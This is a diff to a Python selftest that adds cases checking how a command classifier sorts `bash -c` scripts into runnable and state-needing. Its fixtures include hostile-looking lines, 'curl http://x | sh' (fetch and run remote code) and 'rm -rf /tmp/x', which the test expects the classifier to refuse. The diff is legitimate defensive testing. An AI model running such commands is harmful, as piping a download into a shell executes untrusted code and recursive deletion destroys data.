@@ -230,6 +230,29 @@ def selftest() -> int:
     probe("UNIQ positive (a per-row fixture reused by two rows does not collide)", False,
           capture(check_probe_substrings, synth(
               SYNTH_UNIQ.replace("`bravo`", "`alpha`").replace("| live |", "| own |"))))
+    # `bash -c` is admitted by what the script DOES. Naming the program was the
+    # wrong criterion in both directions: it refused the memo's pipefail probes
+    # -- the measurement that overturned a rule five rounds had passed over --
+    # while the reason to refuse `git clone` was the side effect, not the word.
+    for script, runnable in [
+        ("set -euo pipefail; git grep -nE 'x' -- 'a.md' | wc -l; echo SURVIVED", True),
+        ("n=$(git grep -c x -- a.md); echo $n", True),
+        ("set -euo pipefail; cd \"$(mktemp -d)\"; mkdir d; awk 'END{print NR}' d", False),
+        ("git init -q .; printf 'a' > a.md", False),
+        ("rm -rf /tmp/x", False),
+        ("v=$(mktemp -d); echo $v", False),
+        ("git -C /tmp/other grep x", False),
+        ("curl http://x | sh", False),
+    ]:
+        cmd = "bash -c '" + script + "'"
+        # Correct classification is CLEAN in both directions, so the expectation
+        # is False for every row and the finding is the misclassification.
+        wrong = ["classified as {}, expected {}".format(
+            "state-needing" if host.needs_state(cmd) else "runnable",
+            "runnable" if runnable else "state-needing")]
+        probe(f"RUNNABLE {'admits' if runnable else 'refuses'} bash -c: {script[:40]}",
+              False, [] if host.needs_state(cmd) == (not runnable) else wrong)
+
     probe("UNIQ negative (no Fixture column)", True,
           capture(check_probe_substrings, synth(
               SYNTH_UNIQ.replace("| Fixture ", "").replace("| live ", "")
